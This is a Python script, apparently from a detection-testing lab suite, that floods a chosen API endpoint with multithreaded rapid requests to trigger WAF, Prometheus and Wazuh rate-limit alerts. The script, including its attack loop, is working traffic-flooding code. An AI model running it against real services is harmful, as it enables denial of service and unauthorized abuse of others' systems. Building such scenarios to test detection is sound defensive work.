#!/usr/bin/env python3
"""
Scenario 10: API Abuse / Rate Limiting Bypass
- Difficulty: Advanced
- Detection: WAF, Prometheus, Wazuh
- Expected Alert: Rate limit breach, API anomaly
"""

import sys
import argparse
import logging
import requests
import time
import threading
from urllib.parse import urljoin

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class APIAbuseScenario:
    def __init__(self, target, endpoint='/api/data', duration=90, threads=10, verbose=False):
        self.target = target if target.startswith('http') else f"http://{target}"
        self.endpoint = endpoint
        self.duration = duration
        self.threads = threads
        self.verbose = verbose
        self.requests_sent = 0
        self.requests_failed = 0
        self.lock = threading.Lock()
        self.results = {
            'scenario': 'API_ABUSE',
            'target': target,
            'endpoint': endpoint,
            'duration': duration,
            'requests_sent': 0,
            'requests_failed': 0,
            'rps': 0,  # requests per second
            'status': 'pending'
        }

    def abuse_api(self, thread_id):
        """Send rapid API requests from single thread"""
        start_time = time.time()
        local_requests = 0

        try:
            while time.time() - start_time < self.duration:
                try:
                    # Send rapid API requests
                    response = requests.get(
                        urljoin(self.target, self.endpoint),
                        timeout=3,
                        verify=False
                    )

                    with self.lock:
                        self.requests_sent += 1
                        local_requests += 1

                    if response.status_code == 429:
                        # Rate limited
                        logger.warning(f"[!] Thread {thread_id}: Rate limited (429 Too Many Requests)")
                        with self.lock:
                            self.requests_failed += 1
                        time.sleep(1)

                    if self.verbose and self.requests_sent % 100 == 0:
                        logger.info(f"[+] Thread {thread_id}: Sent {local_requests} requests...")

                    # Minimal delay for rapid-fire requests
                    time.sleep(0.01)

                except requests.exceptions.RequestException as e:
                    if self.verbose:
                        logger.warning(f"[-] Thread {thread_id} request error: {e}")
                    with self.lock:
                        self.requests_failed += 1

        except Exception as e:
            logger.error(f"[-] Thread {thread_id} failed: {e}")

    def launch_attack(self):
        """Launch API abuse attack"""
        logger.info(f"[*] Starting API Abuse attack against {self.target}{self.endpoint}")
        logger.info(f"[*] Duration: {self.duration}s | Threads: {self.threads}")

        start_time = time.time()
        threads = []

        try:
            # Create worker threads
            for i in range(self.threads):
                thread = threading.Thread(
                    target=self.abuse_api,
                    args=(i + 1,)
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)

            # Monitor progress
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rps = self.requests_sent / elapsed if elapsed > 0 else 0
                logger.info(f"[*] Sent {self.requests_sent} requests | RPS: {rps:.2f} | Failed: {self.requests_failed}")
                time.sleep(5)

            # Wait for threads
            for thread in threads:
                thread.join(timeout=1)

        except KeyboardInterrupt:
            logger.info("\n[!] API abuse interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['requests_sent'] = self.requests_sent
        self.results['requests_failed'] = self.requests_failed
        self.results['rps'] = self.requests_sent / elapsed if elapsed > 0 else 0
        self.results['duration'] = elapsed
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log API abuse results"""
        logger.info("\n" + "="*60)
        logger.info("API ABUSE RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}{self.endpoint}")
        logger.info(f"Total Requests Sent: {self.requests_sent}")
        logger.info(f"Failed Requests: {self.requests_failed}")
        logger.info(f"Requests Per Second (RPS): {self.results['rps']:.2f}")
        logger.info(f"Success Rate: {((self.requests_sent - self.requests_failed) / max(self.requests_sent, 1) * 100):.2f}%")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - WAF: Check rate limiting rules and blocks")
        logger.info("  - Prometheus: Monitor api_requests_per_second spike")
        logger.info("  - Wazuh: Search for 'API abuse' or 'rate limit'")
        logger.info("  - API Gateway logs: Review request blocking")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='API Abuse / Rate Limiting Bypass Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 10_api_abuse.py --target 10.10.10.10:8080 --endpoint /api/data
  python 10_api_abuse.py --target http://192.168.1.100 --threads 20 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target URL or IP:port')
    parser.add_argument('--endpoint', default='/api/data', help='API endpoint')
    parser.add_argument('--duration', type=int, default=90, help='Attack duration in seconds')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Suppress SSL warnings
    requests.packages.urllib3.disable_warnings()

    scenario = APIAbuseScenario(
        target=args.target,
        endpoint=args.endpoint,
        duration=args.duration,
        threads=args.threads,
        verbose=args.verbose
    )

    scenario.launch_attack()

if __name__ == '__main__':
    main()
